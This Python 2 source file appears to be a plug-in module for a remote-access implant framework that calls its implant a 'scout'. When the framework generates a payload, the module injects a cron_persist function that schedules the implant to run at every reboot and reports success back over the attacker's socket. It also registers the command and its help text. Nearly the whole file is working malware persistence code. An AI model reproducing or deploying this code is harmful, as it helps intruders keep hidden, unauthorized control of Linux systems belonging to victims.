# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from crontab import CronTab')
        config.import_statements.append('from getpass import getuser')
        config.import_statements.append('from os import path, getcwd')
        config.import_statements.append('from sys import argv')
        config.functions.append('''
def cron_persist():
    cron = CronTab(user=getuser())
    if path.join(getcwd(),path.abspath(argv[0]))[-3:] == '.py':
        job = cron.new(command='python ' + path.join(getcwd(),path.abspath(argv[0])))
    else:
        job = cron.new(command='./' + path.join(getcwd(),path.abspath(argv[0])))
    job.every_reboot() 
    cron.write()
    s.sendall('[+]Acheived persistence via cron job!')
''')
        config.logics.append('''
            elif command == "cron_persist":
                cron_persist()''')
        config.help_menu['cron_persist'] = 'Create a cron job of the scout so it runs at startup'
    elif option == 'info':
        print '\nName             : Cron job persistence component' \
              '\nOS               : Linux' \
              '\nRequired Modules : python-crontab (External), getpass, os, sys' \
              '\nCommands         : cron_persist' \
              '\nDescription      : Create a cron job of the scout so it runs at startup\n'
